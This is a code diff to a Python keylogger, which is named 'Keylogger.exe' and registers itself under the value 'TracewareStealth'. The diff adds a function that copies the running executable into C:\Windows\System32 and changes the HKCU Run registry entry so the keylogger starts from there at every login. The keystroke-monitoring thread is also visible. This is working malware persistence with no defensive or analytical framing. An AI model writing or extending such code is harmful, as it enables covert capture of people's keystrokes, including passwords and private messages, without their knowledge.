@@ -170,12 +170,23 @@ def keystroke_monitor():
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
 keystroke_thread.start()
 
+# Define paths
+original_path = os.path.abspath(__file__)  # Path to the current executable
+system32_path = r"C:\Windows\System32\Keylogger.exe"  # Path to where you want to copy it
+
+# Function to copy the executable to System32
+def copy_executable_to_system32():
+    try:
+        shutil.copy(original_path, system32_path)
+        print("Executable copied to C:\\Windows\\System32.")
+    except Exception as e:
+        print(f"Failed to copy executable to System32: {e}")
+
 # Function to add the script to Windows startup
 def add_to_startup():
     key = r"Software\Microsoft\Windows\CurrentVersion\Run"
     value_name = "TracewareStealth"
-    script_path = os.path.abspath(__file__)  # Get the absolute path of the current executable
-    command = f'"{script_path}" --processStart Keylogger.exe'  # Set the command with the argument
+    command = f'"{system32_path}" --processStart Keylogger.exe'  # Command to run the executable from System32
 
     try:
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
@@ -183,8 +194,8 @@ def add_to_startup():
     except Exception as e:
         print(f"Failed to add to startup: {e}")
 
-# Call the function to add to startup
-add_to_startup()
+# Copy the executable to System32
+copy_executable_to_system32()
 
 # Add to startup
 add_to_startup()
